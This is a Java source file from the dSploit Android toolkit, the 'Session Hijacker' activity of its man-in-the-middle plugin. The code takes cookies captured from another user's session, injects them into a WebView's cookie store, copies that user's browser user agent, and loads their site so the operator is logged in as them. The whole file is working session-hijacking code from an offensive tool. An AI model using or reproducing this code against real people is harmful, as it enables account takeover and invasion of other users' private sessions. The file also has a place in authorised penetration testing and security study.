/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import org.apache.http.impl.cookie.BasicClientCookie;

import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.plugins.mitm.Hijacker.Session;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.SystemClock;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.Menu;
import com.actionbarsherlock.view.MenuInflater;
import com.actionbarsherlock.view.MenuItem;

public class HijackerWebView extends SherlockActivity
{
	private static final String DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4";

	private WebSettings    mSettings = null;
	private WebView 	   mWebView  = null;
	private WebViewTask    mTask 	 = null;
	
	@Override  
    protected void onCreate( Bundle savedInstanceState ) {            
        super.onCreate(savedInstanceState);  
        setTitle( System.getCurrentTarget() + " > MITM > Session Hijacker" );
        setContentView( R.layout.plugin_mitm_hijacker_webview );  
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                
        mWebView  = ( WebView )findViewById( R.id.webView );               
        mTask	  = new WebViewTask();
        mSettings = mWebView.getSettings();  
        
        mSettings.setJavaScriptEnabled(true);  
        mSettings.setBuiltInZoomControls(true);  
		mSettings.setAppCacheEnabled(false);
        mSettings.setUserAgentString( DEFAULT_USER_AGENT );
               
        mTask.execute();
    }  
	
	@Override
	public boolean onCreateOptionsMenu( Menu menu ) {
		MenuInflater inflater = getSupportMenuInflater();
		inflater.inflate( R.menu.browser, menu );		
		return super.onCreateOptionsMenu(menu);
	}

	@Override
	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
			case android.R.id.home:            
	         
				mWebView = null;
				onBackPressed();
				
				return true;
	    	  
			case R.id.back :
				
				if( mWebView.canGoBack() )
					mWebView.goBack();
				
				return true;
				
			case R.id.forward :
				
				if( mWebView.canGoForward() )
					mWebView.goForward();
				
				return true;
				
			case R.id.reload :
				
				mWebView.reload();
				
			default:            
				return super.onOptionsItemSelected(item);    
	   }
	}
	
	private class WebViewTask extends AsyncTask<Void, Void, Boolean> 
	{         		
        @Override  
        protected void onPreExecute() {  
        	CookieSyncManager.createInstance( HijackerWebView.this );              
        	CookieManager.getInstance().removeAllCookie();

            super.onPreExecute();  
        }  
        
        protected Boolean doInBackground( Void... param ) {
        	// Nasty hack to make CookieManager correctly sync
        	SystemClock.sleep(1000);
            return false;  
        }  
        
        @Override  
        protected void onPostExecute(Boolean result) {  
        	Session session = ( Session )System.getCustomData();
        	if( session != null )
        	{
        		String domain    = null,
        			   rawcookie = null;
        		
        		for( BasicClientCookie cookie : session.mCookies.values() )
        		{
        			domain 	  = cookie.getDomain();
        			rawcookie = cookie.getName() + "=" + cookie.getValue() + "; domain=" + domain + "; path=/" + ( session.mHTTPS ? ";secure" : "" );                        
        			        			
        			CookieManager.getInstance().setCookie( domain, rawcookie );
        		}
        		        		        		
        		CookieSyncManager.getInstance().sync();  
        		
        		if( session.mUserAgent != null && session.mUserAgent.isEmpty() == false )
        			mSettings.setUserAgentString( session.mUserAgent );
        		
        		mWebView.loadUrl( ( session.mHTTPS ? "https" : "http" ) + "://www." + domain );
        	}        	
        }  
    }  
		
	@Override
	public void onBackPressed() {
		
		if( mWebView != null && mWebView.canGoBack() )
			mWebView.goBack();
		
		else
		{
			super.onBackPressed();
	    	overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
		}
	}	
}
